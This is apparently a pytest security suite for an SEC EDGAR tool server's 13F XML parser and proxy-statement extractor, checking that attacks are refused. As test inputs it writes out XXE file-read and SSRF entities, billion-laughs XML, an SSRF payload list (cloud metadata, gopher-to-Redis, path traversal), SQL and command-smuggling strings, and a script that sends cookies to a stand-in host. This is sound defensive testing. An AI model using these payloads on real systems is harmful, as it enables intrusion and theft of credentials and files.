"""OWASP + pentest security suite for the v0.4.0 13F + proxy tools.

Concrete invariants on the new attack surface — no empty-coverage padding:

* **A04:2017 XXE / A06:2021 Vulnerable Components** — the 13F parser uses
  ``defusedxml`` (same posture as R8 Form 4): external entities, parameter
  entities, and billion-laughs expansion are all refused with a
  *structured* :class:`ThirteenFParseError` rather than an exfiltration.
* **A10:2021 SSRF** — neither the 13F manager CIK/ticker, the 13F reverse
  ticker, nor the proxy CIK/ticker can smuggle a URL / host into the
  outbound SEC request; the Pydantic gate rejects URL-shaped input.
* **A03:2021 Injection** — adversarial issuer text (script tags, SQL,
  control bytes, log-injection newlines) is treated as inert data by the
  proxy extractor; it never reaches an interpreter and is length-capped.
* **Pentest / DoS** — oversized payloads, deeply nested option rows, and
  unicode-tag XML are bounded before parsing.
"""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from sec_edgar_mcp._proxy import MAX_INPUT_CHARS, extract_proxy_statement
from sec_edgar_mcp._thirteenf import MAX_INPUT_BYTES, parse_13f
from sec_edgar_mcp.errors import SecValidationError, ThirteenFParseError
from sec_edgar_mcp.models import (
    Get13FHoldingsInput,
    GetInstitutionalHoldersInput,
    GetProxyStatementInput,
)

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "https://evil.example/steal",
    "file:///etc/passwd",
    "//evil.example/x",
    "localhost:8080",
    "127.0.0.1:6379",
    "gopher://127.0.0.1:6379/_",
    "../../../../etc/passwd",
    "CIK0000320193/../../secret",
]


# ===========================================================================
# XXE — defusedxml refuses external entities (13F path)
# ===========================================================================


class TestXXE:
    def test_external_entity_file_read_refused(self) -> None:
        payload = (
            b'<?xml version="1.0"?>'
            b'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            b"<informationTable><infoTable><nameOfIssuer>&xxe;</nameOfIssuer></infoTable></informationTable>"
        )
        with pytest.raises(ThirteenFParseError) as ei:
            parse_13f(payload, accession_number="0001067983-24-000020")
        assert "defused XML rejected" in ei.value.reason
        # The /etc/passwd path must NOT appear in the error (no exfiltration).
        assert "etc/passwd" not in ei.value.reason
        assert "root:" not in ei.value.reason

    def test_external_entity_http_ssrf_refused(self) -> None:
        payload = (
            b'<?xml version="1.0"?>'
            b'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
            b"<informationTable><infoTable><value>&xxe;</value></infoTable></informationTable>"
        )
        with pytest.raises(ThirteenFParseError):
            parse_13f(payload)

    def test_parameter_entity_refused(self) -> None:
        payload = (
            b'<?xml version="1.0"?>'
            b'<!DOCTYPE foo [<!ENTITY % pe SYSTEM "http://evil.example/x"> %pe;]>'
            b"<informationTable></informationTable>"
        )
        with pytest.raises(ThirteenFParseError):
            parse_13f(payload)

    def test_billion_laughs_refused(self) -> None:
        payload = (
            b'<?xml version="1.0"?>'
            b"<!DOCTYPE lolz ["
            b'<!ENTITY lol "lol">'
            b'<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
            b'<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
            b"]>"
            b"<informationTable><infoTable><nameOfIssuer>&lol3;</nameOfIssuer></infoTable></informationTable>"
        )
        with pytest.raises(ThirteenFParseError):
            parse_13f(payload)


# ===========================================================================
# SSRF — CIK / ticker cannot redirect the outbound host
# ===========================================================================


class TestSSRF:
    @pytest.mark.parametrize("payload", SSRF_PAYLOADS)
    def test_13f_manager_rejects_ssrf(self, payload: str) -> None:
        with pytest.raises((SecValidationError, ValidationError)):
            Get13FHoldingsInput(cik_or_ticker=payload)

    @pytest.mark.parametrize("payload", SSRF_PAYLOADS)
    def test_institutional_holders_rejects_ssrf(self, payload: str) -> None:
        with pytest.raises((SecValidationError, ValidationError)):
            GetInstitutionalHoldersInput(ticker=payload)

    @pytest.mark.parametrize("payload", SSRF_PAYLOADS)
    def test_proxy_rejects_ssrf(self, payload: str) -> None:
        with pytest.raises((SecValidationError, ValidationError)):
            GetProxyStatementInput(cik_or_ticker=payload)

    def test_quarter_rejects_injection(self) -> None:
        for bad in ["2024Q9", "20XXQ1", "2024-Q1", "'; DROP--", "2024Q1; rm"]:
            with pytest.raises((SecValidationError, ValidationError)):
                Get13FHoldingsInput(cik_or_ticker="AAPL", quarter=bad)


# ===========================================================================
# Injection — adversarial issuer text is inert data
# ===========================================================================


class TestInjection:
    def test_proxy_script_tags_stripped(self) -> None:
        body = (
            "<html><script>fetch('http://evil/?c='+document.cookie)</script>"
            "Annual Meeting on May 1, 2026. Proposal 1: Elect Directors</html>"
        )
        data = extract_proxy_statement(body)
        # Extracted facts carry no executable markup.
        assert data.meeting_date == "May 1, 2026"
        for p in data.proposals:
            assert "<" not in p.title and ">" not in p.title

    def test_proxy_sql_and_log_injection_inert(self) -> None:
        body = "Proposal 1: Approve '; DROP TABLE filings;-- merger\n Annual Meeting on June 1, 2026."
        data = extract_proxy_statement(body)
        # The SQL string survives only as inert plain-text title — no DB exists.
        assert data.proposals[0].number == 1
        assert "DROP TABLE" in data.proposals[0].title
        assert "\n" not in data.proposals[0].title

    def test_13f_issuer_name_with_markup_is_data(self) -> None:
        xml = (
            b"<informationTable><infoTable>"
            b"<nameOfIssuer>&lt;script&gt;evil&lt;/script&gt;</nameOfIssuer>"
            b"<value>100</value></infoTable></informationTable>"
        )
        data = parse_13f(xml)
        # The escaped markup is preserved verbatim as inert text.
        assert "script" in data.holdings[0].name_of_issuer
        assert data.holdings[0].value.is_finite()


# ===========================================================================
# Pentest / DoS bounds
# ===========================================================================


class TestPentestBounds:
    def test_13f_oversized_rejected_before_parse(self) -> None:
        payload = b"<informationTable>" + b" " * (MAX_INPUT_BYTES + 1)
        with pytest.raises(ThirteenFParseError) as ei:
            parse_13f(payload)
        assert "exceeds maximum size" in ei.value.reason

    def test_proxy_oversized_input_is_bounded(self) -> None:
        body = "Annual Meeting on May 1, 2026. " + ("x" * (MAX_INPUT_CHARS * 2))
        data = extract_proxy_statement(body)
        assert any(w.startswith("input_truncated:") for w in data.warnings)

    def test_13f_unicode_namespaced_tags_tolerated(self) -> None:
        xml = (
            '<informationTable xmlns="http://www.sec.gov/edgar/document/thirteenf/informationtable">'
            "<infoTable><nameOfIssuer>CAFÉ HOLDINGS</nameOfIssuer><value>100</value></infoTable>"
            "</informationTable>"
        ).encode()
        data = parse_13f(xml)
        assert data.holdings[0].name_of_issuer == "CAFÉ HOLDINGS"

    def test_proxy_control_bytes_collapsed(self) -> None:
        body = "Annual\tMeeting\non May 1, 2026.\x0b Proposal 1: Foo"
        data = extract_proxy_statement(body)
        assert data.meeting_date == "May 1, 2026"


# ===========================================================================
# Coverage-completion edge branches for the parsers
# ===========================================================================


class TestParserEdgeBranches:
    def test_13f_localname_non_str_tag(self) -> None:
        from sec_edgar_mcp._thirteenf import _localname

        assert _localname(123) == ""

    def test_13f_whitespace_only_decimal_is_zero(self) -> None:
        # A value of only separators strips to "" inside _parse_decimal and
        # returns Decimal(0) (hits the post-strip empty branch).
        xml = b"<informationTable><infoTable><value>,</value></infoTable></informationTable>"
        assert parse_13f(xml).holdings[0].value == 0

    def test_proxy_clean_field_punctuation_only(self) -> None:
        from sec_edgar_mcp._proxy import _clean_field

        assert _clean_field("  ,.; ") is None
        assert _clean_field(None) is None

    def test_proxy_duplicate_proposal_number_deduped(self) -> None:
        body = "Proposal 1: First Title\nProposal 1: Duplicate Title"
        data = extract_proxy_statement(body)
        assert data.proposal_count == 1
        assert data.proposals[0].title == "First Title"

    def test_proxy_punctuation_only_title_not_matched(self) -> None:
        # A "proposal" whose title is punctuation-only does not start with an
        # uppercase letter, so the regex never matches it.
        body = "Proposal 1: .\nProposal 2: Real Title"
        data = extract_proxy_statement(body)
        numbers = [p.number for p in data.proposals]
        assert 2 in numbers
        assert 1 not in numbers
